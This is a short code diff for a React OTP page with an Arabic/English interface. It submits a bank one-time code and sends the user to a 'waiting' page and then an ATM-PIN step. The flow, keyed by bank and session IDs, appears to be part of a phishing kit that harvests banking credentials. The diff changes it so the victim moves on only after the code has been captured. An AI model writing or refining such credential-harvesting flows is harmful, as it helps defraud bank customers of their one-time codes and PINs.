@@ -39,10 +39,11 @@ export default function Otp() {
         otpCode: otp,
         otpType: "standard",
       });
+      // التقدم فقط بعد نجاح الإرسال
       setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=atm-pin`);
     } catch (error) {
-      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "Error during submission");
-      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=atm-pin`);
+      console.error("Error submitting OTP:", error);
+      toast.error(isArabic ? "حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى." : "Error during submission. Please try again.");
     }
   };
 
